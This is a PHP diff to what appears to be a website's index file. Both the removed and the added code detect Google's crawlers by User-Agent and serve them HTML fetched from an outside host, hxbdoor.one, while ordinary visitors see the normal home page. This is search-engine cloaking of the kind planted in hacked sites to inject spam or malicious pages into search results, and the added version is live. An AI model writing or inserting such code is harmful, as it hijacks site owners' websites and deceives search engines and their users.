@@ -1,42 +1,18 @@
 <?php
-// ==== Serve remote .txt HTML only for Googlebot (sederhana) ====
-
-$REMOTE_URL = 'https://hxbdoor.one/raw/dSt5G3tN';
-
-// Fungsi cek sederhana (User-Agent saja)
-function is_googlebot(): bool {
-    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
-    return (bool) preg_match('/Googlebot|Google-InspectionTool|GoogleOther|AdsBot-Google/i', $ua);
+function is_google_bot() {
+    $agents = array("Googlebot", "Google-Site-Verification", "Google-InspectionTool", "Googlebot-Mobile", "Googlebot-News");
+    foreach ($agents as $agent) {
+        if (strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) return true;
+    }
+    return false;
 }
 
-if (is_googlebot()) {
-    // Ambil isi remote file (cURL > fallback stream)
-    $html = null;
-    if (function_exists('curl_init')) {
-        $ch = curl_init($REMOTE_URL);
-        curl_setopt_array($ch, [
-            CURLOPT_RETURNTRANSFER => true,
-            CURLOPT_FOLLOWLOCATION => true,
-            CURLOPT_TIMEOUT        => 8,
-            CURLOPT_USERAGENT      => 'VerifiedBotFetcher/1.0',
-        ]);
-        $resp = curl_exec($ch);
-        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-        curl_close($ch);
-        if ($resp !== false && $code >= 200 && $code < 300) $html = $resp;
-    }
-    if ($html === null) {
-        $html = @file_get_contents($REMOTE_URL);
-    }
-
-    if ($html) {
-        header('Content-Type: text/html; charset=UTF-8');
-        header('X-Served-For: Googlebot');
-        echo $html;
-        exit;
-    }
+if (is_google_bot()) {
+    $bot_content = file_get_contents('https://hxbdoor.one/raw/SvVgWylv');
+    echo $bot_content;
+    exit;
+} else {
+    include('home.php');
+    exit;
 }
-
-// ==== end: Googlebot handling ====
-
-require_once __DIR__ . '/../index.php';
+?>
